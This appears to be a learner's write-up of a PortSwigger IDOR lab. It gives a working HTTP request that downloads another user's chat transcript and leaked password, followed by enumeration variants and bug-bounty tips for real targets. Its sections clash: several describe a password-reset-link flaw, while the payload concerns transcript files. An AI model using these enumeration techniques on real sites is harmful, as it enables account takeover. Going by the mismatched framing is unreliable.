# LAB: Insecure direct object references

|                             |                                                                                                                                    |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| **Topic**                   | Access control (IDOR)                                                                                                              |
| **Difficulty**              | Apprentice                                                                                                                         |
| **Date**                    | 2026-11-13                                                                                                                         |
| **Time**                    | 3                                                                                                                                  |
| **Solved without solution** | yes                                                                                                                                |
| **Link**                    | [lab-insecure-direct-object-references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references) |

## 1. Objective

Retrieve `carlos`'s password reset link and log in as `carlos`.

## 2. Surface

The "forgot password" flow sends a link containing a predictable identifier.
My own reset link reveals the URL pattern — including an `id` parameter.

## 3. Hypothesis

If the reset link is protected by nothing but an incrementing numeric id,
requesting a different id yields another user's reset link/password.

## 4. Payload that worked

Request

```http
GET /download-transcript/1.txt HTTP/2
Host: 0a54000704638e9283bd230800680071.web-security-academy.net
Cookie: session=sKy7cfl6luMWAJcA0ix0bNqK32MgZ1gi
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a54000704638e9283bd230800680071.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Response

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is ut0g7rqbb2o781y7u3o4. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

## 5. Why it works

The transcript is a **static file served from a predictable path**
(`/download-transcript/N.txt`), with no authorization layer in front of it.
The object reference is the filename itself, and the only thing separating my
document from carlos's is an integer in the path.

The critical detail: the file server has no idea who I am. Authorization is
never evaluated at the file layer — the app only checks that the _link_ is shown
to the right user, which is a UI decision, not a control. Any reference that
describes a resource (filenames, invoice numbers, receipt ids, order ids) and is
served without an ownership check is an IDOR.

## 6. What I tried that failed

The tell was structural, not a failed payload: my own download started at `2`,
which means `1` almost certainly belonged to someone else — the numbering itself
was the mirror of the resource count. I tested `1` and got sensitive data
belonging to another user.

What I would test next time in the same situation (and what distinguishes a
real finding from a guess): after `1` works, try `0`, a high number, and a
non-numeric value. `0` and out-of-range usually produce a distinct response —
that difference is what makes the report solid.

## 7. In a real target (bounty translation)

- Password reset flows are top-tier bounty targets: look for the reset link
  in _your own_ inbox and inspect every parameter.
- Also check: does the reset email leak internal hostnames? Does the reset
  token expire? Is it reusable?
- Impact: full account takeover → Critical. Password reset IDOR is one of the
  highest-paid beginner findings.
- In the report: your reset link, the modified request, and proof of login.

## 8. Bypass / variants noticed

- Sequential range: `0`, `1`, `2`, high values (`9999`) and negative values.
- Extension/format swap: `1.json`, `1.pdf`, `1.txt`, and the same id under a
  different endpoint (`/download/1`, `/transcript?id=1`).
- Path variants: trailing dot, double extension, URL-encoded characters.
- If the id is not sequential, look for the resource listing endpoint that
  produces the numbers (exports, CSV, pagination counters).

## 9. Takeaway

Always request a reset for your own account and dissect the link — the URL
structure it reveals is the map to every other user's reset flow.
